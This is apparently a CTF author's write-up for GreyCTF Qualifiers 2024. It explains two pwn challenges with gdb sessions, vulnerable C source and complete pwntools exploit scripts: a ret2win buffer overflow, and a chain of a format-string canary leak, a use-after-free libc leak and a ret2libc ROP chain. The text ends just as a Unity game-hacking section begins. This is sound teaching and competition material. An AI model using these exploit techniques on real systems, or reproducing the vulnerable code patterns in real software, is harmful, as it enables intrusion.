---
id: 22
title: "GreyCTF Qualifiers 2024 - Author's Writeup"
subtitle: "Baby Goods | Slingring Factory | Greycat's Adventure"
date: "2024.06.15"
tags: "greyctf, greyhats, greyctf qualifiers, ctf, ctf blog, writeup"
---

## Foreword

Firstly, apologies for the extremely late author's writeup. I have been pretty swamped these days with other work, and university up till last month had been pretty hectic (the semester has ended together with my GPA).

As a member of NUS Greyhats, I helped create 2 pwn challenges (1 beginner, 1 intermediate) and a unique series of challenges based around a Unity game - Greycat's Adventure. In my haste to develop and publish a game-related challenge, I got lazy and ended up not encrypting the flags, which would lead to the challenges having a massive number of solves. I decided that as it was an oversight on my part, I would just leave the solves in, which was pretty unfortunate.

For the pwn challenges, as we have quite a lot of pwners in Greyhats, I decided to help out with making the easier pwn challenges since we had a god in our midst creating the harder challenges (jro is way too good at this). I will explain the concept behind the challenges as well as the intended solution to the challenges with a walkthrough.

# Pwn | Baby Goods

This was a pwn challenge meant for beginners, with a textbook buffer overflow ret2win. For non-beginners, feel free to skip straight to the next challenge below. The challenge binary is compiled with no PIE and no canary.

The function that we want to reach is `sub_15210123()` which pops shell. The menu only has 2 options, where option 1 leads to the function `buildpram()` and option 2 simply exits the program, so it can be safely ignored.

The vulnerability exits in `buildpram()`, where a buffer of size `0x10` is defined and user input is read directly with `gets()`. This allows us to overflow our buffer and control our program flow.

Opening up the binary in `gdb` to do dynamic analysis, we first set a breakpoint right after the `gets()` call:
```
pwndbg> disassem buildpram
Dump of assembler code for function buildpram:
   0x000000000040123a <+0>:     endbr64
   ...
   0x00000000004012d9 <+159>:   mov    eax,0x0
   0x00000000004012de <+164>:   call   0x401100 <gets@plt>
   0x00000000004012e3 <+169>:   lea    rdx,[rbp-0x24]
   ...

pwndbg> b *0x00000000004012e3
Breakpoint 1 at 0x4012e3
```

I have omitted the irrelevant portions of the output.

After setting the breakpoint, we can run the application with `r`, and place our inputs normally. When we reach our breakpoint, we would see the following on the stack:
```
pwndbg> x/20x $rsp
0x7fffffffe290: 0xffffe2f0      0x00007fff      0xffffe418      0x00000031
0x7fffffffe2a0: 0x64636261      0x00000000      0x00403e18      0x00000000
0x7fffffffe2b0: 0xf7ffd040      0x00007fff      0xf7dca654      0x00000001
0x7fffffffe2c0: 0xffffe2f0      0x00007fff      0x004013e4      0x00000000
0x7fffffffe2d0: 0x00000000      0x00000000      0x004040a0      0x00000000
```

We can see our input on the stack, and since PIE is disabled, the addresseses beginning with `0x40..` would be our potential targets for overriding. Examining each `0x40..` address, we eventually see this in `0x004013e4`:
```
pwndbg> x 0x004013e4
0x4013e4 <menu+186>:    0x8d481beb
```

It points back to `menu()`, to a line that is after the `buildpram()` call. This means that if we override this address and place our desired address (in this case, the address of our winning function `sub_15210123()`), we would be able to redirect our program execution flow to execute the winning function.

From the start of our input, we can see that there are `0x28` bytes from the start of our input until our target, which means that our padding offset in this case would be `0x28`.

We can automate the progress with `pwntools`.
```py
#!/usr/bin/env python

from pwn import *

# set context binary, context log_level
elf = context.binary = ELF("./distribution/babygoods")
# context.log_level = 'debug'

# Start process
p = process("./distribution/babygoods", stdin=process.PTY, stdout=process.PTY)

# Binsh function
binsh = p64(0x401216)
payload = flat({0x28: binsh})

# Easy bof
p.sendlineafter(b': ', "pwn")
p.sendlineafter(b':', "1")
p.sendlineafter(b':', "1")
p.sendlineafter(b':', payload)
p.interactive()
```

Flag: `grey{4s_34sy_4s_t4k1ng_c4ndy_fr4m_4_b4by}`

# Pwn | Slingring Factory

I took inspiration from a challenge from ECSC 2023 for this challenge, and I thought it was pretty interesting to use multiple vulnerabilities together to produce an exploit chain. All security mitigations are enabled for this challenge:
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

Firstly, let's take a look at the entry point of the application. For simplicity's sake, I would be using the source code in my explanation.

In `main()`:
```c
int main() {
  setup();
  char input[6];
  printf("What is your name?\n");
  fgets(input, 6, stdin);
  printf("Hello, ");
  printf(input);
  printf("\n");
  fflush(stdin);
  menu();
}
```

We can see that there is a format string vulnerability as `printf()` is called directly on the user input. We can potentially use this to leak the canary.

This is a menu-based application that has 4 main options which calls 4 functions respectively: `show_slingrings()`, `forge_slingring()`, `discard_slingring()` and `use_slingring()`.

For `show_slingrings()`:
```c
void show_slingrings() {
  announcement();
  printf("[Slot]        | [Amt] | [Destination]\n");
  for (int i = 0; i < 10; i++) {
    if (rings[i]) {
      printf("Ring Slot #%d  | [%d]   | %s\n", i, rings[i]->amt, rings[i]->dest);
    } else {
      printf("Ring Slot #%d  | EMPTY\n", i);
    }
  }
  cls();
  printf("Press ENTER to return.\n");
  getchar();
}
```

This function iterates through our rings array and prints the relevant information with a for loop.

For `forge_slingring()`:
```c
void forge_slingring() {
  char input[0x80];
  char destInput[0x80];
  int amtInput;
  int destId;
  printf("Welcome to the ring forge!\n");
  printf("Which slot do you want to store it in? (0-9)\nThis will override any existing rings!\n");
  fgets(input, 4, stdin);
  destId = atoi(input);
  fflush(stdin);
  if (destId > 9 || destId < 0) {
    errorcl();
    printf("Invalid amount!\n");
    printf("Press ENTER to go back...\n");
    getchar();
    return;
  }
  printf("Enter destination location:\n");
  fgets(input, 0x80, stdin);
  *destInput = *input;
  fflush(stdin);
  printf("Enter amount of rings you want to forge (1-9):\n");
  fgets(input, 4, stdin);
  amtInput = atoi(input);
  fflush(stdin);
  if (amtInput > 9 || amtInput < 1) {
    errorcl();
    printf("Invalid amount!\n");
    printf("Press ENTER to go back...\n");
    getchar();
    return;
  }
  rings[destId] = (slingring_t*) malloc(sizeof(slingring_t));
  rings[destId]->amt = amtInput;
  *(rings[destId]->dest) = *destInput;
  announcement();
  printf("New ring forged!\n");
  printf("%d rings going to location [%s] forged and placed in slot %d.\n", rings[destId]->amt, rings[destId]->dest, destId);
  cls();
  printf("Press ENTER to return.\n");
  getchar();
  return;
}
```

This function allows us to pick which slot of the ring array we wish to store our forged ring, the number of rings as well as the name of our ring(s). It then calls `malloc` to create the ring and places it in our rings array.

For `discard_slingring()`:
```c
void discard_slingring() {
  char input[4];
  int idx;
  printf("Which ring would you like to discard?\n");
  fgets(input, 4, stdin);
  fflush(stdin);
  idx = atoi(input);
  if (idx < 0 || idx > 9) {
    errorcl();
    printf("Invalid index!\n");
    printf("Press ENTER to go back...\n");
    getchar();
    return;
  }
  announcement();
  if (rings[idx]) {
    free(rings[idx]);
    printf("Ring Slot #%d has been discarded.\n", idx);
    cls();
  } else {
    printf("The ring slot is already empty!\n");
  }
  return;
}
```

This is where the next vulnearbility lies. This function lets us delete all rings in a chosen slot, then calls `free()` on the stored pointer. However, it does not set the pointer to null. Recall that in `show_slingring()`, the existence of the rings is checked with `if (rings[i])`. Since our pointer is not set to null, this check will pass and it will print whatever new item the now-freed pointer is pointing to as a string.

For `use_slingring()`:
```c
int use_slingring() {
  char spell[0x33];
  char id[4];
  int inputVal;
  printf("Which ring would you like to use (id): ");
  fgets(id, 4, stdin);
  fflush(stdin);
  inputVal = atoi(id);
  printf("\nPlease enter the spell: ");
  fgets(spell, 0x100, stdin);
  printf("\nThank you for visiting our factory! We will now transport you.\n");
  printf("\nTransporting...\n");
}
```

This is where the last vulnerability lies. There is a buffer overflow in `fgets(spell, 0x100, stdin)` as it takes in `0x100` characters into `char spell[0x33]`. This can potentially allow us to control the program flow.

To summarize, we have a (1) use-after-free vulnerability that leads to a potential information leak and (2) a buffer overflow vulnerability that allows us to potentially control the program flow.

The struct slingring is of size `0x84`, which means that the first 7 freed instances of slingrings will be placed into the tcache. The remaining would go into the unsorted bin then be sorted into the respective bins. Note that since the chunk metadata is of size `0x10`, the freed slingring chunks (`0x94`) would be larger than the largest size of fastbins (`0x88`).

With this, we can form a logic for an exploit chain. We have control of up to 10 bins.
- We need to fill up the tcache (7 chunks), and free 1 more chunk (8th chunk) on top of that.
- The 8th chunk would then be placed into the unsorted bin, which points to the main arena. This allows us to calculate our base libc address.
- Prevent any potential coalescing by keeping a top chunk allocated (allocate a 9th chunk and do not free it).
- Use the buffer overflow to perform a ret2libc

This means that we need to, in order:
1. Use format string vulnerability to leak the canary
2. Create 9 slingrings
3. Free slingring 1-8
4. Call `show_slingrings()` and grab a libc leak
5. Calculate libc base
6. Call `use_slingring()`, buffer overflow and ret2libc

To calculate the offset of the leaked address to libc base, simply use `tele` or find libc base with `vmmap` then subtract the 2 values to get `0x21ace0`.

```py
from pwn import *

# set exploit source, context binary, context log_level, libc
elf = context.binary = ELF("./slingring_factory", checksec=False)
# context.log_level = 'debug'
libc = ELF("./libc.so.6")

# Run binary 1st time
p = process("./slingring_factory")

def forge(n):
  p.sendlineafter(b">>", b"2")
  p.sendlineafter(b"rings!", str(n))
  p.sendlineafter(b":", b"a")
  p.sendlineafter(b":", b"1")
  p.sendline()
 
def disc(n):
  p.sendlineafter(b">>", b"3")
  p.sendlineafter(b"discard?", str(n))

def show():
  p.sendlineafter(b">>", b"1")

# leak canary
p.sendlineafter(b"name?", "%7$p")
p.recvuntil("Hello, ")
canary = int(p.recvn(18), 16)
print(f"{hex(canary) = }")

# create 9 bins
for i in range(9):
  forge(i)

# free 8 bins
for i in range(8):
  disc(i)

# leak libc addr
show()
p.recvuntil(b"Slot #7")
p.recvuntil(b"   | ")

leak = u64(p.recvline().strip().ljust(8,b'\x00'))
print(f"{hex(leak) = }")

offset = 0x21ace0

libc.address = leak - offset
print(f"{hex(libc.address) = }")

# build payload
rop = ROP(libc)

rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))

payload = flat({0x38: p64(canary) + p64(0) + rop.chain()})

# send payload
p.sendline()
p.sendlineafter(b">>", "4")
p.sendlineafter(b":", "1")
p.sendlineafter(b":", payload)

p.clean()
p.interactive()
```

Flag: `grey{y0u_4r3_50rc3r3r_supr3m3_m45t3r_0f_th3_myst1c_4rts_mBRt!y4vz5ea@uq}`

# Greycat's Adventure

So, my original idea was to come up with a Unity game and make the participants hack the game in order to achieve the impossible achievements. When I finished compiling and testing out the game, I realized I did not actually encrypt the flags in my code, which means it would be possible to `strings` most of the flags (less 1) if you find the correct il2cpp file. But at that point it was already really late, in every sense of the word, so I kinda got lazy to re-build and re-test the project. Well, lesson learnt, next game-related challenge will be better.

Either way, I will be sharing the intended solution here in case anyone is interested. I'll go through the achievements one by one. For ease of understanding and convenience of use, I will be using Cheat Engine (yep.) to hack the game.

